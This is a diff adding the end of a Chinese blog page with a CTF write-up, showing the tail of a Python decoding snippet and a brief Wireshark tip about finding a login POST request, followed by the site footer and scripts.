+    for i in f.readlines():
+        de(i[:len(i)-1])
+print(int(bs,2).to_bytes(50,'big')) 
+</code></pre></div></div>
+
+<h3 id="网络鲨鱼">网络鲨鱼</h3>
+
+<p>直接追踪http流找post请求(我web再菜也知道登陆用post啊)</p>
+
+<p><img src="/img/AuroraCtf/wlan/post.png" alt="None" /></p>
+
+</div>
+
+<div>
+	
+	<div class="eof"></div>
+	
+</div>
+
+<!-- <div class="share">
+    <p>Share this post with: </p>
+	<a href="https://twitter.com/intent/tweet?text=AuroraCtf@&amp;url=/ctf/AuroraCtfWriteup.html" class="twitter-share">
+		<span class="fa-stack fa-lg">
+			<i class="fa fa-circle fa-stack-2x"></i>
+			<i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+		</span>
+	</a>
+    
+	<a href="https://www.facebook.com/sharer/sharer.php?u=/ctf/AuroraCtfWriteup.html" class="facebook-share">
+		<span class="fa-stack fa-lg">
+			<i class="fa fa-circle fa-stack-2x"></i>
+			<i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+		</span>
+	</a>
+    
+	<a href="https://plus.google.com/share?url=/ctf/AuroraCtfWriteup.html" class="googleplus-share">
+		<span class="fa-stack fa-lg">
+			<i class="fa fa-circle fa-stack-2x"></i>
+			<i class="fa fa-google-plus fa-stack-1x fa-inverse"></i>
+		</span>
+	</a>
+</div>
+ -->
+
+<div id="disqus_thread"></div>
+
+
+ 
+</div>
+
+
+</article>
+
+  </div>
+
+</body>
+
+<foot>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <center>
+        
+		<p><a class="link" href="/archive/">Archive</a> /
+		<a class="link" href="/category/">Category</a> / 
+		<a class="link" href="/tags/">Tags</a> / 
+		<!-- <a class="link" href="/about/">About</a> / -->
+		<!-- <a class="link" href="/contact/">Contact</a> -->
+        </p>
+
+        <span><script>document.write(new Date().getFullYear());</script></span>
+        <span>&copy;</span>
+        
+		<a class="link" href="https://github.com/Iamjianjian">sofiesJian</a>
+		<br>
+		<span>我们不生产代码,我们只是gayhub的搬运工 </span>
+
+    </center>
+    
+  </div>
+
+</footer>
+
+    <foot>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Derictory -->
+
+  <script src="https://code.jquery.com/jquery-1.7.2.min.js"></script>
+  <script src="https://yandex.st/highlightjs/6.2/highlight.min.js"></script>
+
+<!-- Hit analytics -->
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!-- Directory -->
+
+<script src="/js/main.js"></script>
+
+</foot>
+
+
+</foot>
+
+</html>
